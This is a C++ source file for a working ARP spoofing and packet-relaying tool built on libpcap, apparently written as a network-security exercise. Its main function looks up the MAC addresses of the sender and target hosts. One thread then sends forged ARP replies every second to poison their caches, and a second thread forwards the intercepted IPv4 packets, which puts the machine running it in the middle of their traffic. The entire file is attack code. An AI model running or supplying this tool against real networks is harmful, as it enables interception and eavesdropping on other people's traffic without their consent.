#include <iostream>
#include <thread>
#include <vector>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include "IPv4_addr.h"
#include "infofetcher.h"
#include "arp.h"

using namespace std;

#define LOG_LEVEL_DEBUG 1
#define LOG_LEVEL_INFO 0
#define PCAP_ERR_BUF_SIZE 1024
#define PACK_BUF_SIZE 1024 * 64
#define ARP_SPOOFING_PERIOD 1

static pcap_t *handle;
static IPv4_addr my_ip_addr;
static MAC_addr my_mac_addr;
static vector<IPv4_addr> sender_ips;
static vector<IPv4_addr> target_ips;
static vector<MAC_addr> sender_macs;
static vector<MAC_addr> target_macs;
static int log_level = LOG_LEVEL_INFO;

void thread_spoofing() {
	while(true) {
		// printf("Arp spoofing\n");
		for (u_int i=0; i < sender_macs.size(); i++) {
			send_arp_reply(handle, my_mac_addr, sender_macs[i], target_ips[i], sender_ips[i]);
		}
		sleep(ARP_SPOOFING_PERIOD);
	}
}
void thread_relaying() {
	struct pcap_pkthdr* header_ptr;
	const u_char *pkt_data;
	struct ether_header* eth_hdr;
	struct ip* ip_hdr;
	while(true) {
		int status = pcap_next_ex(handle, &header_ptr, &pkt_data);
		if (status == 0) {
			//no pcaket
			continue;
		} else if (status == -1) {
			fprintf(stderr, "While packet relaying, something wrong on Interface: %s\n", pcap_geterr(handle));
			return;
		} else if (status == -2) {
			fprintf(stderr, "While packet relaying, unexpected accident occured\n");
			return;
		}
		eth_hdr = (struct ether_header*)pkt_data;

		if (ntohs(eth_hdr->ether_type) == ETHERTYPE_IP) {
			ip_hdr = (struct ip*)(pkt_data + sizeof(struct ether_header));
		} else {
			//not IP protocol
			continue;
		}
		if (ip_hdr->ip_v != 4) {
			//IP version it not 4
			continue;
		}
		IPv4_addr dst_ip;
		IPv4_addr src_ip;
		dst_ip.parse_mem((char*)&ip_hdr->ip_dst);
		// cout << "dest IP: ";
		// dst_ip.ascii_dump();
		// cout << endl;
		src_ip.parse_mem((char*)&ip_hdr->ip_src);
		// cout << "src IP: ";
		// src_ip.ascii_dump();
		// cout << endl;
		if (!my_ip_addr.is_equal(dst_ip)) { //its not for mine
			if (log_level >= LOG_LEVEL_DEBUG) {
				cout << "This pack is not for me dest IP: ";
				dst_ip.ascii_dump();
				cout << endl;
				cout << "src IP: ";
				src_ip.ascii_dump();
				cout << endl;
			}
			for (u_int i = 0; i < sender_ips.size(); i++) { //src ip is in sender list
				auto sender_ip = sender_ips[i];
				if (sender_ip.is_equal(src_ip)) {
					MAC_addr dst_mac = target_macs[i]; //got the real mac address
					cout << "Real dest MAC: ";
					dst_mac.hex_dump();
					cout << endl;
					dst_mac.write_mem(eth_hdr->ether_dhost);
					if (pcap_sendpacket(handle, pkt_data, header_ptr->len) == -1) {
						fprintf(stderr, "pcap_sendpacket err %s\n", pcap_geterr(handle));
					} else {
						if (log_level >= LOG_LEVEL_DEBUG) {
							printf("Packet relay Success!\n");
						}
					}
					break;
					// for (int i = 0; i < header_ptr->len; i++) {
					// 	if ( (*(pkt_data + i ) & 0xff) >= 0x10) {
					// 		printf("%x ", *(pkt_data + i) & 0xff);
					// 	} else {
					// 		printf("0%x ", *(pkt_data + i) & 0xff);
					// 	}
					// 	if (i % 16 == 15) {
					// 		putchar('\n');
					// 	}
					// 	 else if (i % 8 == 7) {
					// 		putchar(' ');
					// 	}
					// }
					// putchar('\n');
					// break;
				}
				if (sender_ip.is_equal(dst_ip)) {
					MAC_addr dst_mac = sender_macs[i];
					cout << "Real dest MAC: ";
					dst_mac.hex_dump();
					cout << endl;
					dst_mac.write_mem(eth_hdr->ether_dhost);
					if (pcap_sendpacket(handle, pkt_data, header_ptr->len) == -1) {
						fprintf(stderr, "pcap_sendpacket err %s\n", pcap_geterr(handle));
					} else {
						if (log_level >= LOG_LEVEL_DEBUG) {
							printf("Packet relay Success!\n");
						}
					}
					break;
				}
			}
		}

		// for (int i = 0; i < header_ptr->len; i++) {
		// 	if ( (*(pkt_data + i ) & 0xff) >= 0x10) {
		// 		printf("%x ", *(pkt_data + i) & 0xff);
		// 	} else {
		// 		printf("0%x ", *(pkt_data + i) & 0xff);
		// 	}
		// 	if (i % 16 == 15) {
		// 		putchar('\n');
		// 	}
		// 	 else if (i % 8 == 7) {
		// 		putchar(' ');
		// 	}
		// }
		// putchar('\n');

		// IPv4_addr tmp_ip;
		// tmp_ip.parse_mem(arp_hdr->arp_spa);
		// cout << "sender IP addr -> "; tmp_ip.ascii_dump();
		// cout << endl;
		// if ( !sip.is_equal( tmp_ip ) ) {
		// 	//printf("ip is not matched\n");
		// 	//Sender IP addr not matched
		// 	continue;
		// }
		// ret.parse_mem(arp_hdr->arp_sha);
	}
}
int main(int argc, char *argv[]) {
	char *log_level_str = getenv("LOG_LEVEL");
	
	char errbuf[PCAP_ERR_BUF_SIZE];
	IPv4_addr test_ip;
	char *ifname;
	if (argc < 4) {
		fprintf(stderr, "Usage: %s <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n", argv[0]);
		fprintf(stderr, "\tto use debug mode, you can specify environment variable 'LOG_LEVEL'\n");
		fprintf(stderr, "\te.g) LOG_LEVEL=1 %s eth0 192.168.0.5 192.168.0.1\n", argv[0]);
		return EXIT_FAILURE;
	}
	ifname = argv[1];
	argc -= 2;
	for (int i = 2; i <= argc; i += 2) {
		sender_ips.push_back(argv[i]);
		target_ips.push_back(argv[i+1]);
	}

	if (log_level_str != NULL) {
		log_level=atoi(log_level_str);
	}

	if (log_level >= LOG_LEVEL_DEBUG) {
		for (u_int i=0; i < sender_ips.size(); i++) {
			cout << "sender_ip[" << i << "] - ";
			sender_ips[i].ascii_dump();
			cout << endl;
		}
		for (u_int i=0; i < target_ips.size(); i++) {
			cout << "target_ip[" << i << "] - ";
			target_ips[i].ascii_dump();
			cout << endl;
		}
	}

	get_my_ip_str(ifname, my_ip_addr);
	get_my_mac_str(ifname, my_mac_addr);
	if (log_level >= LOG_LEVEL_DEBUG) {
		cout << "My IPv4 address is ";
		my_ip_addr.ascii_dump();
		cout << endl;
		cout << "My MAC address is ";
		my_mac_addr.hex_dump();
		cout << endl;
	}

	handle = pcap_open_live(ifname, PACK_BUF_SIZE, 0, 1, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Interface open err %s: %s\n", ifname, errbuf);
		exit(EXIT_FAILURE);
	}
	if (log_level >= LOG_LEVEL_DEBUG) {
		printf("Interface open success %s\n", ifname);
	}

	//Gathering Sender's MAC address procedure start
	if (log_level >= LOG_LEVEL_DEBUG) {
		printf("Gathering MAC address of sender IP addr owner...\n");
	}
	for (u_int i = 0; i < sender_ips.size(); i++) {
		auto sender_ip = sender_ips[i];
		if (log_level >= LOG_LEVEL_DEBUG) {
			printf("[%2u/%2lu]Gathering Sender's MAC addr: ", i, sender_ips.size());
			sender_ip.ascii_dump();
			putchar('\n');
			printf("Try to Send ARP request...\n");
		}
		int send_status = send_arp_request(handle, my_mac_addr, my_ip_addr, sender_ip);
		if (send_status == EXIT_SUCCESS) {
			if (log_level >= LOG_LEVEL_DEBUG) {
				printf("Send ARP request success\n");
			}
		} else {
			fprintf(stderr, "Send ARP request failed\n");
			return EXIT_FAILURE;
		}
		MAC_addr tmp_mac;
		if (log_level >= LOG_LEVEL_DEBUG) {
			printf("Try to Receive ARP reqly...\n");
		}
		int recv_status = recv_arp_reply(handle, sender_ip, tmp_mac);
		if (recv_status == EXIT_SUCCESS) {
			if (log_level >= LOG_LEVEL_DEBUG) {
				printf("Receive ARP reply success\n");
			}
		} else {
			fprintf(stderr, "Receive ARP reply failed\n");
			return EXIT_FAILURE;		
		}
		sender_macs.push_back(tmp_mac);
		if (log_level >= LOG_LEVEL_DEBUG) {
			printf("* Store MAC address ");
			tmp_mac.hex_dump();
			cout << " = ";
			sender_ip.ascii_dump();
			cout << endl;
		}
	}

	for (u_int i = 0; i < target_ips.size(); i++) {
		auto target_ip = target_ips[i];
		if (log_level >= LOG_LEVEL_DEBUG) {
			printf("[%2u/%2lu]Gathering Target's MAC addr: ", i, target_ips.size());
			target_ip.ascii_dump();
			putchar('\n');
			printf("Try to Send ARP request...\n");
		}
		int send_status = send_arp_request(handle, my_mac_addr, my_ip_addr, target_ip);
		if (send_status == EXIT_SUCCESS) {
			if (log_level >= LOG_LEVEL_DEBUG) {
				printf("Send ARP request success\n");
			}
		} else {
			fprintf(stderr, "Send ARP request failed\n");
			return EXIT_FAILURE;
		}
		MAC_addr tmp_mac;
		if (log_level >= LOG_LEVEL_DEBUG) {
			printf("Try to Receive ARP reqly...\n");
		}
		int recv_status = recv_arp_reply(handle, target_ip, tmp_mac);
		if (recv_status == EXIT_SUCCESS) {
			if (log_level >= LOG_LEVEL_DEBUG) {
				printf("Receive ARP reply success\n");
			}
		} else {
			fprintf(stderr, "Receive ARP reply failed\n");
			return EXIT_FAILURE;		
		}
		target_macs.push_back(tmp_mac);
		if (log_level >= LOG_LEVEL_DEBUG) {
			printf("* Store MAC address ");
			tmp_mac.hex_dump();
			cout << " = ";
			target_ip.ascii_dump();
			cout << endl;
		}
	}

	//Gathering Sender's MAC address procedure finish
	thread spoofing_thread(thread_spoofing);
	thread relaying_thread(thread_relaying);
	spoofing_thread.join();
	relaying_thread.join();
}